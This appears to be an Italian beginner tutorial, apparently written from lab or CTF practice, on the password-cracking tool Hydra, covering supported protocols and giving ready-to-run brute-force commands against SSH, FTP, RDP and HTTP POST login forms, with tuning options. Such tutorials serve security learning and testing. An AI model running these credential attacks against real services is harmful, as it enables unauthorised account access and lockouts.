---
title: "Hydra"
date: 2026-08-18 08:00:00 +0200
categories: [Cyber Security 101]
tags: [offensive-security-tooling, hydra]
description: "Cos'è Hydra, i protocolli supportati, sintassi di base ed esempi pratici (SSH, FTP, RDP, form HTTP POST), e i limiti da conoscere su rumore e wordlist mirate."
toc: true
---
## Il contesto

Supponiamo di avere un servizio, un sistema di autenticazione, e di non conoscere delle credenziali valide per l'accesso. Potremmo provare sistematicamente a mano combinazioni di username e password contro questo servizio, con la speranza di trovare a una certa una combinazione corretta, tuttavia questo metodo è lentissimo. Esistono strumenti che automatizzano questo processo. Hydra è uno di questi.

## Cos'è Hydra

Hydra è uno strumento di bruteforce/attacco a dizionario per credenziali di login. Funziona contro moltissimi protocolli diversi, tra cui:

- SSH, FTP, Telnet
- HTTP/HTTPS (form di login web, autenticazione base)
- SMB, RDP
- MySQL, PostgreSQL, MSSQL
- SMTP, POP3, IMAP
- VNC
- E molti altri (oltre 50 protocolli in totale)

## Sintassi di base

```bash
hydra -l <username> -P <wordlist> <target> <protocollo>
```

### Esempi pratici

**SSH — bruteforce con username fisso, wordlist di password**

```bash
hydra -l bartender -P /usr/share/wordlists/rockyou.txt ssh://10.113.132.14
```

**SSH — bruteforce sia su username che password** (`-L` invece di `-l`)

```bash
hydra -L users.txt -P rockyou.txt ssh://10.113.132.14
```

**FTP**

```bash
hydra -l admin -P rockyou.txt ftp://10.113.132.14
```

**RDP**

```bash
hydra -l administrator -P rockyou.txt rdp://10.113.163.215
```

**Form di login HTTP POST** (il caso più complesso, ma anche più comune sul web)

```bash
hydra -l dj -P rockyou.txt 10.113.132.14 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Qui devi specificare: il path (`/login`), come sono strutturati i parametri POST (`username=^USER^&password=^PASS^` — Hydra sostituisce `^USER^`/`^PASS^` con i valori che prova), e una stringa che identifica un login fallito (`Invalid credentials`) così Hydra sa distinguere un tentativo riuscito da uno fallito.

### Opzioni utili

```bash
-t 4          # numero di thread paralleli (default 16, riducilo se il target è instabile/rate-limited)
-f            # ferma l'attacco appena trova una combinazione valida
-v / -V       # output verboso, mostra ogni tentativo
-s <porta>    # specifica una porta non standard
```

**Esempio completo con opzioni**

```bash
hydra -l administrator -P rockyou.txt -t 4 -f rdp://10.113.163.215
```

## Osservazioni

- La stringa `http-post-form` va costruita solo dopo aver intercettato una richiesta di login reale (es. con Burp Suite), non a intuito. Path dell'endpoint, nomi esatti dei parametri POST, eventuali campi nascosti come token CSRF, e la stringa di successo/fallimento possono variare parecchio da applicazione ad applicazione — se anche uno solo di questi elementi è sbagliato, l'attacco spesso sembra girare correttamente ma non troverà mai la password giusta, oppure segnalerà come falliti anche i tentativi corretti.


- Hydra è lo strumento standard per verificare la robustezza delle credenziali di un servizio, sia in fase di enumerazione post-ricognizione (SSH, FTP, RDP) sia contro form di login web. Va sempre usato con giudizio: un bruteforce indiscriminato è lento, rumoroso e spesso bloccato da policy di lockout — il vero valore di Hydra emerge quando lo si combina con indizi raccolti altrove (nomi utente reali, pattern di password a tema) invece di affidarsi a una wordlist generica sparata alla cieca.
